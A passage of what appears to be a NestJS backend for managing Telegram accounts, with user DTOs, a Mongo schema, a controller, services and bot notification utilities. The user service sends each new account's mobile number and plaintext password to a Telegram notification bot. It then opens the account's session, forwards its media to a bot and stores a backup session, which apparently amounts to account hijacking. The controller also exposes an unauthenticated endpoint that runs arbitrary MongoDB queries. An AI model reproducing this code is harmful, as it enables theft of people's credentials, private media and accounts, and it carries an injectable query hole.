the user', example: '2022068676' })\n  tgId: string;\n\n  @ApiProperty({ description: 'TwoFA status', example: false })\n  twoFA: boolean = false;\n\n  @ApiProperty({ description: 'Expiration status', example: false })\n  expired: boolean = false;\n\n  @ApiProperty({ description: 'password', example: \"pass\" })\n  password: string = null;\n\n  @ApiProperty({ description: 'Number of movies', example: 0 })\n  movieCount: number = 0;\n\n  @ApiProperty({ description: 'Number of photos', example: 0 })\n  photoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of videos', example: 0 })\n  videoCount: number = 0;\n\n  @ApiProperty({ description: 'Gender of the user', example: null })\n  gender?: string | null;\n\n  @ApiProperty({ description: 'Number of other photos', example: 0 })\n  otherPhotoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of other videos', example: 0 })\n  otherVideoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of own photos', example: 0 })\n  ownPhotoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of own videos', example: 0 })\n  ownVideoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of contacts', example: 105 })\n  contacts: number = 0;\n\n  @ApiProperty({\n    description: 'Call details of the user',\n    example: {\n      outgoing: 1,\n      incoming: 0,\n      video: 1,\n      chatCallCounts: [],\n      totalCalls: 1,\n    },\n  })\n  calls: {\n    outgoing: number;\n    incoming: number;\n    video: number;\n    chatCallCounts: any[];\n    totalCalls: number;\n  };\n\n  @ApiPropertyOptional({\n    description: 'Call details of the user',\n    example: []\n  })\n  recentUsers: any[];\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { Transform, TransformFnParams, Type } from 'class-transformer';\nimport { IsOptional, IsBoolean, IsNumber, IsString } from 'class-validator';\n\nexport class SearchUserDto {\n  @ApiPropertyOptional({ description: 'Filter by Telegram ID' })\n  @IsOptional()\n  @IsString()\n  tgId?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by mobile number' })\n  @IsOptional()\n  @IsString()\n  mobile?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by twoFA status', type: Boolean })\n  @IsOptional()\n  @IsBoolean()\n  twoFA?: boolean;\n\n  @ApiPropertyOptional({ description: 'Filter by Expiration status', type: Boolean })\n  @IsOptional()\n  @IsBoolean()\n  expired?: boolean;\n\n  @ApiPropertyOptional({ description: 'Filter by session' })\n  @IsOptional()\n  @IsString()\n  session?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by first name' })\n  @IsOptional()\n  @IsString()\n  firstName?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by last name' })\n  @IsOptional()\n  @IsString()\n  lastName?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by username' })\n  @IsOptional()\n  @IsString()\n  username?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by channels count' })\n  @IsOptional()\n  @IsNumber()\n  channels?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by personal chats count' })\n  @IsOptional()\n  @IsNumber()\n  personalChats?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by demo given status', type: Boolean })\n  @Transform(({ value }: TransformFnParams) => value === 'true' || value === true)\n  @IsOptional()\n  @IsBoolean()\n  demoGiven?: boolean;\n\n  @ApiPropertyOptional({ description: 'Filter by messages count' })\n  @IsOptional()\n  @IsNumber()\n  msgs?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by total chats count' })\n  @IsOptional()\n  @IsNumber()\n  totalChats?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by last active timestamp' })\n  @IsOptional()\n  @IsNumber()\n  lastActive?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by movie count' })\n  @IsOptional()\n  @IsNumber()\n  movieCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by photo count' })\n  @IsOptional()\n  @IsNumber()\n  photoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by video count' })\n  @IsOptional()\n  @IsNumber()\n  videoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by gender' })\n  @IsOptional()\n  @IsString()\n  gender?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by other photo count' })\n  @IsOptional()\n  @IsNumber()\n  otherPhotoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by other video count' })\n  @IsOptional()\n  @IsNumber()\n  otherVideoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by own photo count' })\n  @IsOptional()\n  @IsNumber()\n  ownPhotoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by own video count' })\n  @IsOptional()\n  @IsNumber()\n  ownVideoCount?: number;\n}\n","import { PartialType } from '@nestjs/mapped-types';\nimport { CreateUserDto } from './create-user.dto';\n\nexport class UpdateUserDto extends PartialType(CreateUserDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose from 'mongoose';\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\n\nexport type UserDocument = User & Document;\n\n@Schema({\n  collection: 'users', versionKey: false, autoIndex: true, timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class User {\n  @ApiProperty()\n  @Prop({ required: true, unique: true })\n  mobile: string;\n\n  @ApiProperty()\n  @Prop({ required: true, unique: true })\n  session: string;\n\n  @ApiProperty()\n  @Prop()\n  firstName: string;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  lastName: string | null;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  username: string | null;\n\n  @ApiProperty()\n  @Prop()\n  channels: number;\n\n  @ApiProperty()\n  @Prop()\n  personalChats: number;\n\n  @ApiProperty()\n  @Prop()\n  demoGiven: boolean;\n\n  @ApiProperty()\n  @Prop()\n  msgs: number;\n\n  @ApiProperty()\n  @Prop()\n  totalChats: number;\n\n  @ApiProperty()\n  @Prop()\n  lastActive: string;\n\n  @ApiProperty()\n  @Prop({ required: true, unique: true })\n  tgId: string;\n\n  @ApiProperty()\n  @Prop()\n  movieCount: number;\n\n  @ApiProperty()\n  @Prop()\n  photoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  videoCount: number;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  gender: string | null;\n\n  @Prop({ required: false, type: Boolean })\n  twoFA: boolean = false\n\n  @Prop({ required: false, type: Boolean, default: false })\n  expired: boolean = false\n\n  @Prop({ required: false })\n  password: string = null\n\n  @ApiProperty()\n  @Prop()\n  otherPhotoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  otherVideoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  ownPhotoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  ownVideoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  contacts: number;\n\n  @ApiProperty()\n  @Prop({\n    type: mongoose.Schema.Types.Mixed,\n    default: {\n      outgoing: 0,\n      incoming: 0,\n      video: 0,\n      chatCallCounts: [],\n      totalCalls: 0,\n    },\n  })\n  calls: {\n    outgoing: number;\n    incoming: number;\n    video: number;\n    chatCallCounts: any[];\n    totalCalls: number;\n  };\n\n  @ApiPropertyOptional()\n  @Prop({\n    type: mongoose.Schema.Types.Mixed,\n    default: [],\n    required: false,\n  })\n  recentUsers: any[];\n\n  \n}\n\nexport const UserSchema = SchemaFactory.createForClass(User);\n","import { Controller, Get, Post, Body, Param, Patch, Delete, Query } from '@nestjs/common';\nimport { UsersService } from './users.service';\nimport { User } from './schemas/user.schema';\nimport { ApiTags, ApiOperation, ApiParam } from '@nestjs/swagger';\nimport { SearchUserDto } from './dto/search-user.dto';\nimport { UpdateUserDto } from './dto/update-user.dto';\nimport { CreateUserDto } from './dto/create-user.dto';\n\n@ApiTags('Telegram Users') // Tag to categorize all endpoints in this controller\n@Controller('user')\nexport class UsersController {\n  constructor(private readonly usersService: UsersService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create a new user' })\n  async create(@Body() createUserDto: CreateUserDto) {\n    console.log(\"creating new user\")\n    return this.usersService.create(createUserDto);\n  }\n\n  @Get('/search')\n  @ApiOperation({ summary: 'Search users based on various parameters' })\n  async search(@Query() queryParams: SearchUserDto): Promise<User[]> {\n    return this.usersService.search(queryParams);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all users' })\n  async findAll() {\n    return this.usersService.findAll();\n  }\n\n  @Get(':tgId')\n  @ApiOperation({ summary: 'Get a user by tgId' })\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\n  async findOne(@Param('tgId') tgId: string) {\n    return this.usersService.findOne(tgId);\n  }\n\n  @Patch(':tgId')\n  @ApiOperation({ summary: 'Update a user by tgId' })\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\n  async update(@Param('tgId') tgId: string, @Body() updateUserDto: UpdateUserDto) {\n    return this.usersService.update(tgId, updateUserDto);\n  }\n\n  @Delete(':tgId')\n  @ApiOperation({ summary: 'Delete a user by tgId' })\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\n  async remove(@Param('tgId') tgId: string) {\n    return this.usersService.delete(tgId);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  async executeQuery(@Body() requestBody: any): Promise<any> {\n    const { query, sort, limit, skip } = requestBody;\n    try {\n      return await this.usersService.executeQuery(query, sort, limit, skip);\n    } catch (error) {\n      throw error;  // You might want to handle errors more gracefully\n    }\n  }\n\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { UsersService } from './users.service';\nimport { UsersController } from './users.controller';\nimport { UserSchema } from './schemas/user.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ClientModule } from '../clients/client.module';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: 'userModule', schema: UserSchema, collection: 'users' }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => ClientModule)\n  ],\n  controllers: [UsersController],\n  providers: [UsersService],\n  exports: [UsersService]\n})\nexport class UsersModule { }\n","import { TelegramService } from './../Telegram/Telegram.service';\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { User, UserDocument } from './schemas/user.schema';\nimport { SearchUserDto } from './dto/search-user.dto';\nimport { ClientService } from '../clients/client.service';\nimport { UpdateUserDto } from './dto/update-user.dto';\nimport { CreateUserDto } from './dto/create-user.dto';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { connectionManager } from '../Telegram/utils/connection-manager';\n\n@Injectable()\nexport class UsersService {\n  constructor(@InjectModel('userModule') private userModel: Model<UserDocument>,\n    @Inject(forwardRef(() => TelegramService))\n    private telegramService: TelegramService,\n    @Inject(forwardRef(() => ClientService))\n    private clientsService: ClientService\n  ) { }\n\n  async create(user: CreateUserDto): Promise<User | undefined> {\n    const activeClientSetup = this.telegramService.getActiveClientSetup();\n    console.log(\"New User received - \", user?.mobile);\n    console.log(\"ActiveClientSetup::\", activeClientSetup);\n    if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {\n      console.log(\"Updating New Session Details\", user.mobile, user.username, activeClientSetup.clientId)\n      await this.clientsService.updateClientSession(user.session)\n    } else {\n      await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\\nMobile: t.me/${user.mobile}${user.password ? `\\npassword: ${user.password}` : \"\\n\"}`)}`);//Msgs:${user.msgs}\\nphotos:${user.photoCount}\\nvideos:${user.videoCount}\\nmovie:${user.movieCount}\\nPers:${user.personalChats}\\nChan:${user.channels}\\ngender-${user.gender}\\n`)}`)//${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);\n      setTimeout(async () => {\n        try {\n          await connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });\n          this.telegramService.forwardMediaToBot(user.mobile, null);\n          const newSession = await this.telegramService.createNewSession(user.mobile);\n          const newUserBackup = new this.userModel({ ...user, session: newSession, lastName: \"Backup\" });\n          await newUserBackup.save();\n        } catch (error) {\n          console.log(\"Error in creating new session\", error);\n        }\n      }, 3000);\n      const newUser = new this.userModel(user);\n      return newUser.save();\n    }\n  }\n\n  async findAll(): Promise<User[]> {\n    return this.userModel.find().exec();\n  }\n\n  async findOne(tgId: string): Promise<User> {\n    const user = await (await this.userModel.findOne({ tgId }).exec())?.toJSON()\n    if (!user) {\n      throw new NotFoundException(`User with tgId ${tgId} not found`);\n    }\n    return user;\n  }\n\n  async update(tgId: string, user: UpdateUserDto): Promise<number> {\n    delete user['_id']\n    const result = await this.userModel.updateMany({ tgId }, { $set: user }, { new: true, upsert: true }).exec();\n    if (result.matchedCount === 0) {\n      throw new NotFoundException(`Users with tgId ${tgId} not found`);\n    }\n    return result.modifiedCount;\n  }\n\n  async updateByFilter(filter: any, user: UpdateUserDto): Promise<number> {\n    delete user['_id']\n    const result = await this.userModel.updateMany(filter, { $set: user }, { new: true, upsert: true }).exec();\n    if (result.matchedCount === 0) {\n      throw new NotFoundException(`Users with tgId ${JSON.stringify(filter)} not found`);\n    }\n    return result.modifiedCount;\n  }\n\n  async delete(tgId: string): Promise<void> {\n    const result = await this.userModel.deleteOne({ tgId }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`User with tgId ${tgId} not found`);\n    }\n  }\n  async search(filter: SearchUserDto): Promise<User[]> {\n    if (filter.firstName) {\n      filter.firstName = { $regex: new RegExp(filter.firstName, 'i') } as any\n    }\n    if (filter.twoFA !== undefined) {\n      filter.twoFA = filter.twoFA as any === 'true' || filter.twoFA as any === '1' || filter.twoFA === true;\n    }\n    console.log(filter)\n    return this.userModel.find(filter).sort({ updatedAt: -1 }).exec();\n  }\n\n  async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<User[]> {\n    try {\n      if (!query) {\n        throw new BadRequestException('Query is invalid.');\n      }\n      const queryExec = this.userModel.find(query);\n\n      if (sort) {\n        queryExec.sort(sort);\n      }\n\n      if (limit) {\n        queryExec.limit(limit);\n      }\n\n      if (skip) {\n        queryExec.skip(skip);\n      }\n\n      return await queryExec.exec();\n    } catch (error) {\n      throw new InternalServerErrorException(error.message);\n    }\n  }\n\n}\n","export enum PrivacyLevelEnum {\r\n    everybody = 'everybody',\r\n    contacts = 'contacts',\r\n    nobody = 'nobody'\r\n}\r\n\r\nexport type PrivacyLevel = keyof typeof PrivacyLevelEnum;\r\n\r\nexport interface ActiveClientSetup {\r\n    days?: number;\r\n    archiveOld: boolean;\r\n    formalities: boolean;\r\n    newMobile: string;\r\n    existingMobile: string;\r\n    clientId: string;\r\n}\r\n\r\nexport interface ChatStatistics {\r\n    period: 'day' | 'week' | 'month';\r\n    totalMessages: number;\r\n    uniqueSenders: number;\r\n    messageTypes: {\r\n        text: number;\r\n        photo: number;\r\n        video: number;\r\n        voice: number;\r\n        other: number;\r\n    };\r\n    topSenders: Array<{\r\n        id: string;\r\n        count: number;\r\n    }>;\r\n    mostActiveHours: Array<{\r\n        hour: number;\r\n        count: number;\r\n    }>;\r\n}\r\n\r\nexport interface ContentFilter {\r\n    chatId: string;\r\n    keywords?: string[];\r\n    mediaTypes?: ('photo' | 'video' | 'document')[];\r\n    actions: ('delete' | 'warn' | 'mute')[];\r\n}\r\n\r\nexport interface MessageScheduleOptions {\r\n    chatId: string;\r\n    message: string;\r\n    scheduledTime: Date;\r\n    replyTo?: number;\r\n    silent?: boolean;\r\n}\r\n\r\nexport interface GroupOptions {\r\n    title: string;\r\n    members?: string[];\r\n    photo?: string;\r\n    about?: string;\r\n    address?: string;\r\n    slowMode?: number;\r\n    megagroup?: boolean;\r\n    forImport?: boolean;\r\n    memberRestrictions?: {\r\n        sendMessages?: boolean;\r\n        sendMedia?: boolean;\r\n        sendStickers?: boolean;\r\n        sendGifs?: boolean;\r\n        sendGames?: boolean;\r\n        sendInline?: boolean;\r\n        embedLinks?: boolean;\r\n    };\r\n}\r\n\r\nexport interface ChannelInfo {\r\n    chatsArrayLength: number;\r\n    canSendTrueCount: number;\r\n    canSendFalseCount: number;\r\n    ids: string[];\r\n    canSendFalseChats: string[];\r\n}\r\n\r\nexport interface ChatFolderOptions {\r\n    name: string;\r\n    includedChats: string[];\r\n    excludedChats?: string[];\r\n    includeContacts?: boolean;\r\n    includeNonContacts?: boolean;\r\n    includeGroups?: boolean;\r\n    includeBroadcasts?: boolean;\r\n    includeBots?: boolean;\r\n    excludeMuted?: boolean;\r\n    excludeRead?: boolean;\r\n    excludeArchived?: boolean;\r\n}","import { NestFactory } from '@nestjs/core';\nimport mongoose from 'mongoose'\nimport { AppModule } from './app.module';\nimport { DocumentBuilder, SwaggerModule } from '@nestjs/swagger';\nimport { ValidationPipe } from '@nestjs/common';\nimport { Request, Response, NextFunction } from 'express';\n\nasync function bootstrap() {\n  const app = await NestFactory.create(AppModule);\n  const config = new DocumentBuilder()\n    .setTitle('NestJS and Express API')\n    .setDescription('API documentation')\n    .setVersion('1.0')\n    .build();\n\n  interface CustomRequest extends Request {}\n  interface CustomResponse extends Response {}\n  interface CustomNextFunction extends NextFunction {}\n\n  app.use((req: CustomRequest, res: CustomResponse, next: CustomNextFunction) => {\n    res.header('Access-Control-Allow-Origin', '*');\n    res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');\n    res.header('Access-Control-Allow-Headers', 'Content-Type, Accept');\n    next();\n  });\n\n  app.enableCors({\n    allowedHeaders: \"*\",\n    origin: \"*\"\n  });\n  const document = SwaggerModule.createDocument(app, config);\n  // fs.writeFileSync('./swagger-spec.json', JSON.stringify(document, null, 2));\n  SwaggerModule.setup('api', app, document);\n  mongoose.set('debug', true)\n  app.useGlobalPipes(new ValidationPipe({\n    transform: true,\n    // whitelist: true,\n    // forbidNonWhitelisted: true,\n    transformOptions: {\n      enableImplicitConversion: true\n    },\n    // validationError: {\n    //   target: false,\n    //   value: undefined\n    // }\n  }));\n  process.on('unhandledRejection', (reason, promise) => {\n    console.error('Unhandled Rejection at:', promise, 'reason:', reason);\n  });\n\n  process.on('uncaughtException', (reason, promise) => {\n    console.error(promise, reason);\n  });\n\n  let isShuttingDown = false;\n  const shutdown = async (signal: string) => {\n    if (isShuttingDown) return;\n    isShuttingDown = true;\n    console.log(`${signal} received`);\n    await app.close();\n    process.exit(0);\n  };\n\n  process.on('exit', async () => {\n    console.log('Application closed');\n  });\n\n  process.on('SIGINT', async () => {\n    await shutdown('SIGINT');\n  });\n\n  process.on('SIGTERM', async () => {\n    await shutdown('SIGTERM');\n  });\n\n  process.on('SIGQUIT', async () => {\n    await shutdown('SIGQUIT');\n  });\n\n  await app.init();\n  await app.listen(process.env.PORT || 9000);\n  console.log(`Application is running on: ${await app.getUrl()}`);\n}\nbootstrap();\n","import { Injectable, NestMiddleware, Logger } from '@nestjs/common';\nimport { Request, Response, NextFunction } from 'express';\nimport { fetchWithTimeout } from '../utils/fetchWithTimeout';\nimport { parseError } from '../utils/parseError';\nimport { notifbot } from '../utils/logbots';\n\n@Injectable()\nexport class LoggerMiddleware implements NestMiddleware {\n    private readonly logger = new Logger('HTTP');\n\n    use(req: Request, res: Response, next: NextFunction): void {\n        const { method, originalUrl, baseUrl } = req;\n        const userAgent = req.get('user-agent') || '';\n        const ip = req.ip;\n\n        const excludedEndpoints = ['/sendtochannel', '/favicon.', '/tgsignup', '/timestamps'];\n        const isExcluded = (url: string) => excludedEndpoints.some(endpoint => url.startsWith(endpoint));\n        if (!isExcluded(originalUrl) && originalUrl !== '/') {\n            res.on('finish', () => {\n                const { statusCode } = res;\n                const contentLength = res.get('content-length');\n                if (statusCode >= 500) {\n                    fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${statusCode}`)}`);\n                    this.logger.error(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                } else if (statusCode >= 400) {\n                    fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${statusCode}`)}`);\n                    this.logger.warn(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                } else if (statusCode >= 300) {\n                    this.logger.verbose(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                } else {\n                    this.logger.log(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                }\n            });\n            res.on('error', (error) => {\n                const errorDetails = parseError(error, process.env.clientId);\n                fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${errorDetails.message}`)}`);\n            })\n        } else {\n            if (originalUrl.includes('Video')) {\n                this.logger.log(`Excluded endpoint hit: ${originalUrl} (length: ${originalUrl.length})`);\n            }\n        }\n\n        next();\n    }\n}\n","export function sleep(ms: number): Promise<void> {\n  return new Promise(resolve => setTimeout(resolve, ms));\n}\n\nexport function contains(str: string | null | undefined, arr: string[]): boolean {\n  if (!str || !Array.isArray(arr)) return false;\n  return arr.some(element => element && str.includes(element));\n}\n\nexport function toBoolean(value: string | number | boolean | null | undefined): boolean {\n  if (value === null || value === undefined) return false;\n  if (typeof value === 'string') {\n    const normalizedValue = value.toLowerCase().trim();\n    return normalizedValue === 'true' || normalizedValue === '1' || normalizedValue === 'yes';\n  }\n  if (typeof value === 'number') {\n    return value !== 0;\n  }\n  return value;\n}\n\nexport function fetchNumbersFromString(inputString: string | null | undefined): string {\n  if (!inputString) return '';\n  const regex = /\\d+/g;\n  const matches = inputString.match(regex);\n  return matches ? matches.join('') : '';\n}\n\nexport const defaultReactions = Object.freeze([\n  '', '', '', '', '', '',\n  '', '', '', '', '', '',\n  '', '', '', '', '', '',\n  '', '', '', '', '', '',\n  '', '', '', '', '', '',\n  '', '', '', '', '', '',\n  '', '', '', '', '',\n  '', '', '', '', ''\n] as const);\n\nexport const defaultMessages = Object.freeze([\n  \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\",\n  \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\",\n  \"16\", \"17\", \"18\", \"19\", \"20\", \"21\"\n] as const);\n\nexport function areJsonsNotSame(json1: unknown, json2: unknown): boolean {\n  const keysToIgnore = ['id', '_id'];\n  console.log('[areJsonsNotSame] Starting comparison...');\n\n  function normalizeObject(obj: unknown): unknown {\n    if (obj === null || obj === undefined) return obj;\n    if (typeof obj !== 'object') return obj;\n    if (Array.isArray(obj)) return obj.map(normalizeObject);\n\n    const normalized: Record<string, unknown> = {};\n    const sortedKeys = Object.keys(obj as Record<string, unknown>)\n      .filter(key => !keysToIgnore.includes(key))\n      .sort();\n\n    for (const key of sortedKeys) {\n      normalized[key] = normalizeObject((obj as Record<string, unknown>)[key]);\n    }\n    return normalized;\n  }\n  const normalized1 = normalizeObject(json1);\n  const normalized2 = normalizeObject(json2);\n  const result = JSON.stringify(normalized1) !== JSON.stringify(normalized2);\n  console.log(`[areJsonsNotSame] Comparison result: ${result ? 'Objects are different' : 'Objects are same'}`);\n  \n  return result;\n}\n\nexport function mapToJson<K extends string | number | symbol, V>(map: Map<K, V>): Record<string, V> {\n  if (!(map instanceof Map)) {\n    throw new Error('Input must be a Map instance');\n  }\n  const obj: Record<string, V> = {};\n  for (const [key, value] of map.entries()) {\n    obj[String(key)] = value;\n  }\n  return obj;\n}\n\nexport function shouldMatch(obj) {\n    const regex = /(wife|adult|lanj|chat||||lesb|aunty|girl|boy|tamil|kannad|telugu|hindi|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi)/i\n    const titleMatch = obj.title && regex.test(obj.title);\n    const usernameMatch = obj.username && regex.test(obj.username);\n    return !!(titleMatch || usernameMatch);\n}","import axios from 'axios';\n\nexport enum ChannelCategory {\n    CLIENT_UPDATES = 'CLIENT_UPDATES',\n    USER_WARNINGS = 'USER_WARNINGS',\n    VC_WARNINGS = 'VC_WARNINGS',\n    USER_REQUESTS = 'USER_REQUESTS',\n    VC_NOTIFICATIONS = 'VC_NOTIFICATIONS',\n    CHANNEL_NOTIFICATIONS = 'CHANNEL_NOTIFICATIONS',\n    ACCOUNT_NOTIFICATIONS = 'ACCOUNT_NOTIFICATIONS',\n    ACCOUNT_LOGIN_FAILURES = 'ACCOUNT_LOGIN_FAILURES',\n    PROMOTION_ACCOUNT = 'PROMOTION_ACCOUNT',\n    CLIENT_ACCOUNT = 'CLIENT_ACCOUNT',\n    PAYMENT_FAIL_QUERIES = 'PAYMENT_FAIL_QUERIES',\n    SAVED_MESSAGES = 'SAVED_MESSAGES',\n}\n\ntype ChannelData = {\n    botTokens: string[];\n    botUsernames: string[];\n    lastUsedIndex: number;\n    channelId: string;\n};\n\nexport class BotConfig {\n    private static instance: BotConfig;\n    private categoryMap = new Map<ChannelCategory, ChannelData>();\n    private initialized = false;\n    private initPromise: Promise<void>;\n\n    private constructor() {\n        this.initPromise = this.initialize();\n    }\n\n    public static getInstance(): BotConfig {\n        if (!BotConfig.instance) {\n            BotConfig.instance = new BotConfig();\n        }\n        return BotConfig.instance;\n    }\n\n    public async ready(): Promise<void> {\n        if (!this.initialized) {\n            await this.initPromise;\n        }\n    }\n\n    private async initialize(): Promise<void> {\n        console.debug('Initializing Telegram channel configuration...');\n\n        const envKeys = Object.keys(process.env).filter(key =>\n            key.startsWith('TELEGRAM_CHANNEL_CONFIG_')\n        );\n\n        for (const key of envKeys) {\n            const value = process.env[key];\n            if (!value) continue;\n\n            const [channelId, description = '', botTokensStr] = value.split('::');\n            const botTokens = botTokensStr?.split(',').map(t => t.trim()).filter(Boolean);\n            if (!channelId || !botTokens || botTokens.length === 0) continue;\n\n            const category = this.getCategoryFromDescription(description);\n            if (!category) continue;\n\n            const botUsernames: string[] = [];\n            for (const token of botTokens) {\n                const username = await this.fetchUsername(token);\n                if (!username) {\n                    throw new Error(`Invalid bot token for ${category}`);\n                }\n                botUsernames.push(username);\n            }\n\n            this.categoryMap.set(category, {\n                botTokens,\n                botUsernames,\n                lastUsedIndex: -1,\n                channelId,\n            });\n        }\n\n        this.initialized = true;\n        console.info('BotConfig initialized.');\n    }\n\n    private getCategoryFromDescription(desc: string): ChannelCategory | null {\n        const normalized = desc.toUpperCase();\n        return (Object.values(ChannelCategory) as string[]).find(cat => normalized.includes(cat)) as ChannelCategory ?? null;\n    }\n\n    private async fetchUsername(token: string): Promise<string> {\n        try {\n            const res = await axios.get(`https://api.telegram.org/bot${token}/getMe`);\n            return res.data?.ok ? res.data.result.username : '';\n        } catch {\n            return '';\n        }\n    }\n\n    public getBotUsername(category: ChannelCategory): string {\n        this.assertInitialized();\n\n        const data = this.categoryMap.get(category);\n        if (!data || data.botUsernames.length === 0) {\n            throw new Error(`No valid bots for ${category}`);\n        }\n\n        data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botUsernames.length;\n        return data.botUsernames[data.lastUsedIndex];\n    }\n\n    public getChannelId(category: ChannelCategory): string {\n        this.assertInitialized();\n\n        const data = this.categoryMap.get(category);\n        if (!data) {\n            throw new Error(`No config for ${category}`);\n        }\n\n        return data.channelId;\n    }\n\n    public getBotAndChannel(category: ChannelCategory): { username: string; channelId: string; token: string } {\n        this.assertInitialized();\n\n        const data = this.categoryMap.get(category);\n        if (!data || data.botUsernames.length === 0) {\n            throw new Error(`No valid bots for ${category}`);\n        }\n\n        data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botUsernames.length;\n        return {\n            username: data.botUsernames[data.lastUsedIndex],\n            channelId: data.channelId,\n            token: data.botTokens[data.lastUsedIndex],\n        };\n    }\n\n    public async sendMessage(category: ChannelCategory, message: string): Promise<void> {\n        this.assertInitialized();\n\n        const data = this.categoryMap.get(category);\n        if (!data || data.botTokens.length === 0) {\n            throw new Error(`No valid bots for ${category}`);\n        }\n\n        data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botTokens.length;\n        const token = data.botTokens[data.lastUsedIndex];\n        const channelId = data.channelId;\n        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${channelId}&text=${encodeURIComponent(message)}`;\n\n        axios.post(url).catch(error => {\n            console.error(`Failed to send message to ${channelId}:`, error);\n        });\n    }\n\n    public getAllBotUsernames(category: ChannelCategory): string[] {\n        this.assertInitialized();\n\n        const data = this.categoryMap.get(category);\n        if (!data || data.botUsernames.length === 0) {\n            throw new Error(`No valid bots for ${category}`);\n        }\n\n        return [...data.botUsernames];\n    }\n\n    private assertInitialized() {\n        if (!this.initialized) {\n            throw new Error('BotConfig not initialized. App module has not finished initializing.');\n        }\n    }\n}\n","import axios, { AxiosRequestConfig, AxiosResponse } from \"axios\";\r\nimport { extractMessage, parseError } from \"./parseError\";\r\nimport { ppplbot } from \"./logbots\";\r\nimport { sleep } from \"../utils\";\r\n\r\n// Configuration types\r\ninterface RetryConfig {\r\n    maxRetries: number;\r\n    baseDelay: number;\r\n    maxDelay: number;\r\n    jitterFactor: number;\r\n}\r\n\r\ninterface NotificationConfig {\r\n    enabled: boolean;\r\n    channelEnvVar: string;\r\n    timeout: number;\r\n}\r\n\r\n// Default configurations\r\nconst DEFAULT_RETRY_CONFIG: RetryConfig = {\r\n    maxRetries: 3,\r\n    baseDelay: 500, // Start with 500ms\r\n    maxDelay: 30000, // Cap at 30 seconds\r\n    jitterFactor: 0.2, // Add up to 20% jitter\r\n};\r\n\r\nconst DEFAULT_NOTIFICATION_CONFIG: NotificationConfig = {\r\n    enabled: true,\r\n    channelEnvVar: 'httpFailuresChannel',\r\n    timeout: 5000,\r\n};\r\n\r\n/**\r\n * Sends error notifications to configured channels\r\n * @param prefix - Notification 